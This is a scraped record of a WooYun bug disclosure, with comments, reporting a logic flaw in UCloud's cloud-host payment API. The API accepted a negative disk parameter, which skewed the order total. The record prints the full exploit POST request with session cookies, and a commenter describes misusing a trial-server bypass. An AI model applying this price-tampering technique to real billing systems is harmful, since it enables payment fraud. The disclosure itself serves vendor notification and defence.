{"id": 5767, "wybug_id": "wooyun-2014-048562", "wybug_title": "UCloud 支付系统存在逻辑错误 导致可刷钱购买任意主机(已证明)", "wybug_corp": "UCloud", "wybug_author": "猪猪侠", "wybug_date": "2014-01-11 18:34", "wybug_open_date": "2014-02-25 18:35", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-25：\t细节向公众公开  简要描述： UCloud 支付系统存在判断错误 可导致刷钱购买任意主机(已证明) 详细说明：  #1 问题描述由于在创建云主机填写服务器参数时，服务器未严格校验来自客户端提交的订单参数。#2 漏洞原因DISK参数未判断是否为负数，导致计算最终金额失误\nPOST /api/instance/orderpay_mode=2&count=1&cpu=2&disk=-2000000&memory=2048&\n#3 利用EXP\nPOST /api/instance/order HTTP/1.1Host: uhost.ucloud.cnConnection: keep-aliveContent-Length: 353Accept: application/json, text/javascript, */*; q=0.01Origin: https://uhost.ucloud.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: https://uhost.ucloud.cn/Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: PHPSESSID=ST-1389411761r767E0AD311ECA06177; Hm_lvt_62f4f23a826efd41750a4479e4cb2491=1387715471,1388750071,1389411748; Hm_lpvt_62f4f23a826efd41750a4479e4cb2491=1389413539; __utma=242209926.1025238294.1383140674.1389013138.1389411747.39; __utmb=242209926.35.10.1389411747; __utmc=242209926; __utmz=242209926.1383186629.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)pay_mode=2&count=1&cpu=2&disk=-2000000&memory=2048&band_width=1&isp_id=0&hostname=ucloudvpshd001&image_id=cd57da3144a01e03dd844ea3b23d2954&image_name=CentOS+6.5+64%E4%BD%8D&password=**********&public_secgroup=8095&use_high_performance_disk=0&individual_disk=&net_lanch=0&quantity=1&ecshop_license=&use_session=yes&format=json&region_id=1&zone_id=1\n即可成功生成一个订单，并可执行支付！\n\n   漏洞证明：  # 成功支付后，获得了很多余额，并可以购买主机\n\n\n\n\n\n   修复方案：  # 服务端做严格判断~! 我是用正常用户做的测试，请别封号呀，里面还有我自己的余额的！   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-01-13 22:39 厂商回复： 感谢，已经修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-11 12:54 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  87V5!    \n     2014-01-11 12:58 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  前排围观    \n     2014-01-11 18:44 |    \t\t九九 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | 暂无。)\t\t \n  前排围观     \n     2014-01-12 00:09 |    \t\t宇少 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:41        | Jyhack-TeaM：bbs.jyhack.com 群:308694453...)\t\t \n  mark~    \n     2014-02-25 20:36 |    \t\ttSt \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:7        | 在开发里运维最强，运维里网络最强，网络里...)\t\t \n  危害等级：低-_-!    \n     2014-02-25 22:56 |    \t\t乌云一哥 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:1        | echo file_get_contents('http://www.wooyu...)\t\t \n  危害等级是低无疑。这个洞早已知道而且在使用，他们注册账号和开关试用服务器都是人工的。。。别指望可以刷个结束日期就可以长期使用。。。。    \n     2014-02-25 22:59 |    \t\t乌云一哥 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:1        | echo file_get_contents('http://www.wooyu...)\t\t \n  注：我不是胡扯的，我亲测，我绕过按键不能点击开了一个一年的试用主机，但是在使用了十多天后，他们给我打电话，问我们试用的服务器是否满意，是否可以关闭了。。。。。不信自己试试    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}